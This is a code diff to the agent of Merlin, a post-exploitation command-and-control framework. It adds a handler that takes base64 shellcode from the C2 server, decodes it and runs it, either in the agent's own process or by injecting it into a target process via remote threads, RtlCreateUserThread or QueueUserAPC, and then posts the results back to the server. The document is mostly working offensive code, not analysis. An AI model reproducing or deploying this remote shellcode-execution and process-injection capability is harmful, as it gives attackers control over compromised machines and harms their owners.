@@ -1,6 +1,6 @@
 // Merlin is a post-exploitation command and control framework.
 // This file is part of Merlin.
-// Copyright (C) 2018  Russel Van Tuyl
+// Copyright (C) 2019  Russel Van Tuyl
 
 // Merlin is free software: you can redistribute it and/or modify
 // it under the terms of the GNU General Public License as published by
@@ -23,6 +23,7 @@ import (
 	"crypto/tls"
 	"encoding/base64"
 	"encoding/json"
+	"errors"
 	"fmt"
 	"io/ioutil"
 	"math/rand"
@@ -613,6 +614,88 @@ func (a *Agent) statusCheckIn(host string, client *http.Client) {
 					message("warn", fmt.Sprintf("Unknown AgentControl message type received %s", p.Command))
 				}
 			}
+		case "Shellcode":
+			if a.Verbose{message("note", "Received Execute shellcode command")}
+
+			var s messages.Shellcode
+			var e error
+			var so string
+			var se string
+
+			errShellcode := json.Unmarshal(payload, &s)
+
+			if errShellcode != nil {
+				e = errShellcode
+			} else {
+				e = a.executeShellcode(s) // Execution method determined in function
+			}
+
+			if e != nil{
+				se = e.Error()
+				so = ""
+				if a.Verbose {
+					message("warn", fmt.Sprintf("There was an error: %s", se))
+				}
+			} else {
+				so = "Shellcode executed successfully"
+				se = ""
+			}
+
+			c := messages.CmdResults{
+				Job:    s.Job,
+				Stdout: so,
+				Stderr: se,
+			}
+
+			k, errMarshal := json.Marshal(c)
+
+			if errMarshal != nil {
+				if a.Verbose {
+					message("warn", "There was an error marshalling the CmdResults message in the shellocde section")
+					message("warn",  errMarshal.Error())
+				}
+			}
+
+			g := messages.Base{
+				Version: 1.0,
+				ID:      j.ID,
+				Type:    "CmdResults",
+				Payload: (*json.RawMessage)(&k),
+				Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
+			}
+
+			b2 := new(bytes.Buffer)
+
+			errEncode := json.NewEncoder(b2).Encode(g)
+
+			if a.Verbose {
+				if errEncode != nil {
+					message("warn", fmt.Sprintf("There was an error encoding the JSON message\r\n%s", errEncode.Error()))
+				} else {
+					message("note", fmt.Sprintf("Sending response to server: %s", so))
+				}
+			}
+
+			if a.Debug {
+				message("info", fmt.Sprintf("About to send POST to server for job %s \r\nSTDOUT:\r\n%s\r\nSTDERR:\r\n%s", s.Job, so, se))
+			}
+
+
+			resp2, errPost := client.Post(host, "application/json; charset=utf-8", b2)
+
+			if errPost != nil {
+				if a.Verbose {
+					message("warn", "There was an error sending the CmdResults message to the server in the shellcode section")
+					message("warn", errPost.Error())
+				}
+			}
+
+			if resp2.StatusCode != 200 {
+				if a.Verbose {
+					message("warn", fmt.Sprintf("Message error from server. HTTP Status code: %d", resp2.StatusCode))
+				}
+			}
+
 		default:
 			if a.Verbose {
 				message("warn", fmt.Sprintf("Received unrecognized message type: %s", j.Type))
@@ -672,6 +755,69 @@ func (a *Agent) executeCommand(j messages.CmdPayload) (stdout string, stderr str
 	}
 
 	return stdout, stderr // TODO return if the output was stdout or stderr and color stderr red on server
+}
+
+func (a *Agent) executeShellcode(shellcode messages.Shellcode) error {
+
+	if a.Debug {
+		message("debug", fmt.Sprintf("Received input parameter for executeShellcode function: %v", shellcode))
+	}
+
+	shellcodeBytes, errDecode := base64.StdEncoding.DecodeString(shellcode.Bytes)
+
+	if errDecode != nil{
+		if a.Verbose {
+			message("warn", fmt.Sprintf("There was an error decoding the Base64 string: %s", shellcode.Bytes))
+			message("warn", errDecode.Error())
+		}
+		return errDecode
+	}
+
+	if a.Verbose {message("info", fmt.Sprintf("Shelcode execution method: %s", shellcode.Method))}
+	if a.Debug{message("info", fmt.Sprintf("Executing shellcode %s", shellcodeBytes))}
+
+	if shellcode.Method == "self" {
+		err := ExecuteShellcodeSelf(shellcodeBytes)
+		if err != nil {
+			if a.Verbose {
+				message("warn", fmt.Sprintf("There was an error executing the shellcode: \r\n%s", shellcodeBytes))
+				message("warn", fmt.Sprintf("Error: %s", err.Error()))
+			}
+		} else {if a.Verbose {message("success", "Shellcode was successfully executed")}}
+		return err
+	} else if shellcode.Method == "remote" {
+		err := ExecuteShellcodeRemote(shellcodeBytes, shellcode.PID)
+		if err != nil {
+			if a.Verbose {
+				message("warn", fmt.Sprintf("There was an error executing the shellcode: \r\n%s", shellcodeBytes))
+				message("warn", fmt.Sprintf("Error: %s", err.Error()))
+			}
+		} else {if a.Verbose {message("success", "Shellcode was successfully executed")}}
+		return err
+	} else if shellcode.Method == "rtlcreateuserthread" {
+		err := ExecuteShellcodeRtlCreateUserThread(shellcodeBytes, shellcode.PID)
+		if err != nil {
+			if a.Verbose {
+				message("warn", fmt.Sprintf("There was an error executing the shellcode: \r\n%s", shellcodeBytes))
+				message("warn", fmt.Sprintf("Error: %s", err.Error()))
+			}
+		} else {if a.Verbose {message("success", "Shellcode was successfully executed")}}
+		return err
+	}else if shellcode.Method == "userapc" {
+		err := ExecuteShellcodeQueueUserAPC(shellcodeBytes, shellcode.PID)
+		if err != nil {
+			if a.Verbose {
+				message("warn", fmt.Sprintf("There was an error executing the shellcode: \r\n%s", shellcodeBytes))
+				message("warn", fmt.Sprintf("Error: %s", err.Error()))
+			}
+		} else {if a.Verbose {message("success", "Shellcode was successfully executed")}}
+		return err
+	}else {
+		if a.Verbose{
+			message("warn", fmt.Sprintf("Invalid shellcode execution method: %s", shellcode.Method))
+		}
+		return errors.New(fmt.Sprintf("invalid shellcode execution method %s", shellcode.Method))
+	}
 }
 
 func (a *Agent) agentInfo(host string, client *http.Client) {
